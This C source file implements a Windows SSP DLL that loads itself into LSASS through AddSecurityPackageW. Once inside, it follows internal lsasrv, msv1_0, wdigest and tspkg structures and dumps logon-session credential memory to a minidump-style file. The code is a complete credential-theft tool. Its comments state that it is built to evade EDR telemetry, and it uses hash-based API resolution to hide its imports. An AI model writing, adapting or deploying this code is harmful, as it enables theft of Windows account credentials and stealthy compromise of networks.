/**
 * ssp.c — In-process LSASS credential extractor (SSP DLL).
 * Loaded via AddSecurityPackageW, runs inside LSASS address space.
 * All memory reads are LOCAL — zero kernel ETW-Ti events.
 *
 * Build: make cross_ssp (produces bin/ssp.dll)
 */

#include <windows.h>
#include "../include/ntdefs.h"

#pragma pack(push, 1)
typedef struct { DWORD Sig; WORD Ver; WORD Impl; DWORD NumStr; DWORD DirRva;
                 DWORD Chk; DWORD Ts; ULONG64 Flags; } MHDR;
typedef struct { DWORD Type; DWORD Size; DWORD Rva; } MDIR;
typedef struct { WORD Arch; WORD ProcLvl; WORD ProcRev; BYTE NProc; BYTE Prod;
                 DWORD Maj; DWORD Min; DWORD Bld; DWORD Plat; DWORD CsdRva;
                 WORD Suite; WORD R2; BYTE Cpu[24]; } MSYS;
typedef struct { ULONG64 Start; ULONG64 Size; } MDSC;
typedef struct { ULONG64 NRanges; ULONG64 BaseRva; } M64H;
#pragma pack(pop)

typedef struct { PVOID base; DWORD size; DWORD ts; WCHAR nm[260]; DWORD nl; } MODI;
typedef struct { PVOID base; DWORD size; } REGI;
#define MAX_M 256
#define MAX_R 4096

/* ── no-CRT helpers ────────────────────────────────── */

static void zmem(void *d, int n) {
    volatile BYTE *p = (volatile BYTE *)d;
    while (n-- > 0) *p++ = 0;
}

static void cmem(void *d, const void *s, int n) {
    BYTE *dp = (BYTE *)d; const BYTE *sp = (const BYTE *)s;
    while (n-- > 0) *dp++ = *sp++;
}

/* ── DJB2 + export resolver ────────────────────────── */

static DWORD djb2(const char *s) {
    DWORD h = 5381;
    while (*s) h = ((h << 5) + h) + (unsigned char)*s++;
    return h;
}

static PVOID gexp(PVOID base, DWORD hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE *)base + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    DWORD *nms = (DWORD *)((BYTE *)base + exp->AddressOfNames);
    WORD *ords = (WORD *)((BYTE *)base + exp->AddressOfNameOrdinals);
    DWORD *fns = (DWORD *)((BYTE *)base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++)
        if (djb2((const char *)((BYTE *)base + nms[i])) == hash)
            return (BYTE *)base + fns[ords[i]];
    return NULL;
}

/* ── ntdll function types ──────────────────────────── */

typedef NTSTATUS (NTAPI *fn_Create)(PHANDLE, ACCESS_MASK,
    POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER,
    ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *fn_Write)(HANDLE, HANDLE, PVOID, PVOID,
    PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS (NTAPI *fn_Close)(HANDLE);
typedef NTSTATUS (NTAPI *fn_Alloc)(HANDLE, PVOID *, ULONG_PTR,
    PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fn_Free)(HANDLE, PVOID *, PSIZE_T, ULONG);

/* ── file writer state ─────────────────────────────── */

static fn_Write g_wfn;
static HANDLE g_fh;

static void wf(const void *d, DWORD n) {
    if (!g_fh || !g_wfn || !n) return;
    IO_STATUS_BLOCK io;
    g_wfn(g_fh, NULL, NULL, NULL, &io, (PVOID)d, n, NULL, NULL);
}

/* ── alloc/free via NtAllocateVirtualMemory ────────── */

static fn_Alloc g_alloc;
static fn_Free g_free;

static PVOID amem(SIZE_T sz) {
    PVOID p = NULL; SIZE_T r = sz;
    if (!g_alloc) return NULL;
    if (g_alloc((HANDLE)-1, &p, 0, &r, 0x3000, 0x04) != 0) return NULL;
    return p;
}

static void fmem(PVOID p) {
    if (!p || !g_free) return;
    SIZE_T s = 0;
    g_free((HANDLE)-1, &p, &s, 0x8000);
}

/* ── case-insensitive suffix match ─────────────────── */

static BOOL eci(const WCHAR *s, DWORD sc, const WCHAR *suf, DWORD sufc) {
    if (sc < sufc) return FALSE;
    const WCHAR *p = s + sc - sufc;
    for (DWORD i = 0; i < sufc; i++) {
        WCHAR a = p[i], b = suf[i];
        if (a >= L'A' && a <= L'Z') a += 32;
        if (b >= L'A' && b <= L'Z') b += 32;
        if (a != b) return FALSE;
    }
    return TRUE;
}

/* ── credential extraction + MDMP writer ───────────── */

static void do_extract(HINSTANCE hDll) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY cur = head->Flink;

    /* ntdll is the second module in InMemoryOrderModuleList */
    cur = cur->Flink;
    PLDR_DATA_TABLE_ENTRY ne = (PLDR_DATA_TABLE_ENTRY)((BYTE *)cur - 0x10);
    PVOID ntdll = ne->DllBase;
    if (!ntdll) return;

    fn_Create pCF = (fn_Create)gexp(ntdll, 0x15A5ECDB);
    g_wfn      = (fn_Write) gexp(ntdll, 0xD69326B2);
    fn_Close pCL = (fn_Close)gexp(ntdll, 0x8B8E133D);
    g_alloc     = (fn_Alloc)gexp(ntdll, 0x6793C34C);
    g_free      = (fn_Free) gexp(ntdll, 0x471AA7E9);
    if (!pCF || !g_wfn || !pCL || !g_alloc) return;

    /* Find own DLL path from PEB → derive output path (.dll → .dat) */
    wchar_t opath[280];
    int op = 0;
    opath[op++] = L'\\'; opath[op++] = L'?';
    opath[op++] = L'?'; opath[op++] = L'\\';

    BOOL found = FALSE;
    cur = head->Flink;
    while (cur != head) {
        PLDR_DATA_TABLE_ENTRY e = (PLDR_DATA_TABLE_ENTRY)((BYTE *)cur - 0x10);
        if (e->DllBase == (PVOID)hDll && e->FullDllName.Buffer) {
            DWORD ch = e->FullDllName.Length / 2;
            if (ch > 270) ch = 270;
            for (DWORD i = 0; i < ch; i++)
                opath[op++] = e->FullDllName.Buffer[i];
            found = TRUE;
            break;
        }
        cur = cur->Flink;
    }
    if (!found) return;

    int ld = -1;
    for (int i = 0; i < op; i++)
        if (opath[i] == L'.') ld = i;
    if (ld >= 0 && ld + 3 < 280) {
        opath[ld + 1] = L'd'; opath[ld + 2] = L'a'; opath[ld + 3] = L't';
        if (ld + 4 < op) op = ld + 4;
    }
    opath[op] = L'\0';

    UNICODE_STRING us;
    us.Buffer = opath; us.Length = (USHORT)(op * 2); us.MaximumLength = us.Length + 2;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iosb;
    g_fh = NULL;

    NTSTATUS st = pCF(&g_fh, 0x40100000, &oa, &iosb, NULL,
        0x80, FILE_SHARE_READ, FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (st != 0 || !g_fh) return;

    MODI *mods = (MODI *)amem(sizeof(MODI) * MAX_M);
    REGI *regs = (REGI *)amem(sizeof(REGI) * MAX_R);
    if (!mods || !regs) { pCL(g_fh); fmem(mods); fmem(regs); return; }

    /* Enumerate modules (LOCAL PEB walk — zero NtReadVirtualMemory) */
    DWORD mc = 0;
    cur = head->Flink;
    while (cur != head && mc < MAX_M) {
        PLDR_DATA_TABLE_ENTRY e = (PLDR_DATA_TABLE_ENTRY)((BYTE *)cur - 0x10);
        if (e->DllBase && e->SizeOfImage) {
            mods[mc].base = e->DllBase;
            mods[mc].size = e->SizeOfImage;
            mods[mc].ts   = e->TimeDateStamp;
            mods[mc].nl   = 0;
            if (e->FullDllName.Length && e->FullDllName.Buffer) {
                DWORD nb = e->FullDllName.Length;
                if (nb > 518) nb = 518;
                cmem(mods[mc].nm, e->FullDllName.Buffer, nb);
                mods[mc].nl = nb;
                mods[mc].nm[nb / 2] = 0;
            }
            mc++;
        }
        cur = cur->Flink;
    }
    if (mc == 0) { pCL(g_fh); fmem(mods); fmem(regs); return; }

    /* Collect credential regions (LOCAL pointer following) */
    DWORD rc = 0;
    WCHAR s_msv[] = L"\\msv1_0.dll";
    WCHAR s_wdg[] = L"\\wdigest.dll";
    WCHAR s_srv[] = L"\\lsasrv.dll";
    WCHAR s_tsp[] = L"\\tspkg.dll";
    PVOID lsbase = NULL;

    for (DWORD i = 0; i < mc && rc < MAX_R - 4; i++) {
        DWORD nc = mods[i].nl / 2;
        if (eci(mods[i].nm, nc, s_msv, 11) ||
            eci(mods[i].nm, nc, s_wdg, 12) ||
            eci(mods[i].nm, nc, s_tsp, 10)) {
            regs[rc].base = mods[i].base;
            regs[rc].size = mods[i].size;
            rc++;
        } else if (eci(mods[i].nm, nc, s_srv, 11)) {
            lsbase = mods[i].base;
            regs[rc].base = (BYTE *)mods[i].base + 0x175000;
            regs[rc].size = 0xA000;
            rc++;
        }
    }

    if (lsbase) {
        BYTE *ld2 = (BYTE *)lsbase + 0x175000;

        PVOID ah = *(PVOID *)(ld2 + 0x8258);
        PVOID dh = *(PVOID *)(ld2 + 0x8260);
        if (ah && (ULONG_PTR)ah > 0x10000 && rc < MAX_R) {
            regs[rc].base = ah; regs[rc].size = 512; rc++;
        }
        if (dh && (ULONG_PTR)dh > 0x10000 && rc < MAX_R) {
            regs[rc].base = dh; regs[rc].size = 512; rc++;
        }

        DWORD toff = 0x6620;
        for (DWORD b = 0; b < 32; b++) {
            ULONG64 fl = *(ULONG64 *)(ld2 + toff + b * 16);
            ULONG64 ba = (ULONG64)(ULONG_PTR)(ld2 + toff + b * 16);
            if (fl == 0 || fl == ba || fl < 0x10000) continue;

            ULONG64 ec2 = fl;
            for (int ch = 0; ch < 16 && ec2 && ec2 != ba && ec2 > 0x10000; ch++) {
                BYTE *ent = (BYTE *)(ULONG_PTR)ec2;
                if (rc < MAX_R) { regs[rc].base = (PVOID)ec2; regs[rc].size = 0x120; rc++; }

                USHORT ul = *(USHORT *)(ent + 0x90);
                ULONG64 up = *(ULONG64 *)(ent + 0x98);
                if (up > 0x10000 && ul && ul < 512 && rc < MAX_R) {
                    regs[rc].base = (PVOID)(ULONG_PTR)up; regs[rc].size = ul; rc++;
                }

                USHORT dl2 = *(USHORT *)(ent + 0xA0);
                ULONG64 dp = *(ULONG64 *)(ent + 0xA8);
                if (dp > 0x10000 && dl2 && dl2 < 512 && rc < MAX_R) {
                    regs[rc].base = (PVOID)(ULONG_PTR)dp; regs[rc].size = dl2; rc++;
                }

                ULONG64 cp = *(ULONG64 *)(ent + 0x108);
                if (cp > 0x10000) {
                    BYTE *cl = (BYTE *)(ULONG_PTR)cp;
                    if (rc < MAX_R) { regs[rc].base = (PVOID)(ULONG_PTR)cp; regs[rc].size = 24; rc++; }
                    ULONG64 pp = *(ULONG64 *)(cl + 16);
                    if (pp > 0x10000) {
                        BYTE *pm = (BYTE *)(ULONG_PTR)pp;
                        if (rc < MAX_R) { regs[rc].base = (PVOID)(ULONG_PTR)pp; regs[rc].size = 40; rc++; }
                        USHORT el = *(USHORT *)(pm + 24);
                        ULONG64 ep = *(ULONG64 *)(pm + 32);
                        if (ep > 0x10000 && el && el < 4096 && rc < MAX_R) {
                            regs[rc].base = (PVOID)(ULONG_PTR)ep; regs[rc].size = el; rc++;
                        }
                    }
                }
                ec2 = *(ULONG64 *)(ent + 0);
            }
        }
    }

    /* ── Build + write MDMP ────────────────────────── */

    DWORD ns = mc > 0 ? 3 : 2;
    DWORD hdr_sz = sizeof(MHDR);
    DWORD dir_sz = sizeof(MDIR) * ns;
    DWORD sys_sz = sizeof(MSYS);
    DWORD csd_rva = hdr_sz + dir_sz + sys_sz;

    DWORD ml_sz = 0, mn_sz = 0;
    if (mc > 0) {
        ml_sz = 4 + 108 * mc;
        for (DWORD i = 0; i < mc; i++) {
            mn_sz += 4 + mods[i].nl + 2;
            if ((mods[i].nl + 2) % 4 != 0)
                mn_sz += 4 - ((mods[i].nl + 2) % 4);
        }
    }
    DWORD m64_hsz = (DWORD)(sizeof(M64H) + sizeof(MDSC) * rc);
    DWORD sys_rva = hdr_sz + dir_sz;
    DWORD ml_rva  = csd_rva + 8;
    DWORD mn_rva  = ml_rva + ml_sz;
    DWORD m64_rva = mn_rva + mn_sz;
    DWORD data_rva = m64_rva + m64_hsz;

    MHDR hdr;
    zmem(&hdr, sizeof(hdr));
    hdr.Sig = 0x504D444D; hdr.Ver = 0xA793;
    hdr.NumStr = ns; hdr.DirRva = hdr_sz;
    hdr.Ts = *(volatile DWORD *)((BYTE *)(ULONG_PTR)0x7FFE0000 + 0x320);
    hdr.Flags = 2;
    wf(&hdr, sizeof(hdr));

    MDIR dirs[3];
    zmem(dirs, sizeof(dirs));
    DWORD di = 0;
    dirs[di].Type = 7; dirs[di].Size = sys_sz; dirs[di].Rva = sys_rva; di++;
    if (mc > 0) { dirs[di].Type = 4; dirs[di].Size = ml_sz; dirs[di].Rva = ml_rva; di++; }
    dirs[di].Type = 9; dirs[di].Size = m64_hsz; dirs[di].Rva = m64_rva;
    wf(dirs, sizeof(MDIR) * ns);

    MSYS si;
    zmem(&si, sizeof(si));
    si.Arch = 9; si.NProc = 1; si.Prod = 1;
    si.Maj = peb->OSMajorVersion; si.Min = peb->OSMinorVersion;
    si.Bld = (DWORD)peb->OSBuildNumber; si.Plat = 2; si.CsdRva = csd_rva;
    wf(&si, sizeof(si));

    BYTE csd[8]; zmem(csd, 8); wf(csd, 8);

    if (mc > 0) {
        wf(&mc, 4);
        DWORD ncur = mn_rva;
        for (DWORD i = 0; i < mc; i++) {
            BYTE me[108]; zmem(me, 108);
            *(ULONG64 *)&me[0] = (ULONG64)(ULONG_PTR)mods[i].base;
            *(DWORD *)&me[8] = mods[i].size;
            *(DWORD *)&me[16] = mods[i].ts;
            *(DWORD *)&me[20] = ncur;
            wf(me, 108);
            DWORD ssz = 4 + mods[i].nl + 2;
            if ((mods[i].nl + 2) % 4 != 0) ssz += 4 - ((mods[i].nl + 2) % 4);
            ncur += ssz;
        }
        for (DWORD i = 0; i < mc; i++) {
            DWORD bc = mods[i].nl;
            wf(&bc, 4);
            wf(mods[i].nm, bc);
            BYTE pad[6]; zmem(pad, 6);
            DWORD pl = 2;
            if ((bc + 2) % 4 != 0) pl += 4 - ((bc + 2) % 4);
            wf(pad, pl);
        }
    }

    M64H m64h; zmem(&m64h, sizeof(m64h));
    m64h.NRanges = rc; m64h.BaseRva = data_rva;
    wf(&m64h, sizeof(m64h));

    for (DWORD i = 0; i < rc; i++) {
        MDSC desc;
        desc.Start = (ULONG64)(ULONG_PTR)regs[i].base;
        desc.Size  = regs[i].size;
        wf(&desc, sizeof(desc));
    }

    /* Write region data directly from LSASS address space */
    for (DWORD i = 0; i < rc; i++)
        wf(regs[i].base, regs[i].size);

    fmem(regs); fmem(mods);
    pCL(g_fh); g_fh = NULL;
}

/* ── DLL entry ─────────────────────────────────────── */

static HINSTANCE g_dll = NULL;

__declspec(dllexport)
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH)
        g_dll = hDll;
    return TRUE;
}

/* ── SSP interface — extraction runs here (no loader lock) ─ */

__declspec(dllexport)
NTSTATUS __stdcall SpLsaModeInitialize(
    ULONG LsaVersion, PULONG PackageVersion,
    PVOID *ppTables, PULONG pcTables) {
    (void)LsaVersion;

    do_extract(g_dll);

    *PackageVersion = 1;
    *pcTables = 0;
    *ppTables = NULL;
    return (NTSTATUS)0x80090302;
}

/* ── rundll32 entry — triggers SSP load into LSASS ───── */

typedef NTSTATUS (NTAPI *fn_LdrLoad)(PWCHAR, PULONG, PUNICODE_STRING, PVOID *);
typedef long (__stdcall *fn_AddPkg)(wchar_t *, void *);

__declspec(dllexport)
void CALLBACK Install(HWND hwnd, HINSTANCE hinst, LPSTR cmd, int nShow) {
    (void)hwnd; (void)hinst; (void)cmd; (void)nShow;

    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY cur = head->Flink;

    cur = cur->Flink;
    PLDR_DATA_TABLE_ENTRY ne = (PLDR_DATA_TABLE_ENTRY)((BYTE *)cur - 0x10);
    PVOID ntdll = ne->DllBase;
    if (!ntdll) return;

    fn_LdrLoad pLdr = (fn_LdrLoad)gexp(ntdll, 0x0307DB23);
    if (!pLdr) return;

    wchar_t sn[] = L"sspicli.dll";
    UNICODE_STRING us;
    us.Buffer = sn; us.Length = 22; us.MaximumLength = 24;
    PVOID hLib = NULL;
    if (pLdr(NULL, NULL, &us, &hLib) != 0 || !hLib) return;

    fn_AddPkg pAdd = (fn_AddPkg)gexp(hLib, 0x5A913429);
    if (!pAdd) return;

    wchar_t *path = NULL;
    cur = head->Flink;
    while (cur != head) {
        PLDR_DATA_TABLE_ENTRY e = (PLDR_DATA_TABLE_ENTRY)((BYTE *)cur - 0x10);
        if (e->DllBase == (PVOID)g_dll && e->FullDllName.Buffer) {
            path = e->FullDllName.Buffer;
            break;
        }
        cur = cur->Flink;
    }
    if (!path) return;

    pAdd(path, NULL);
}
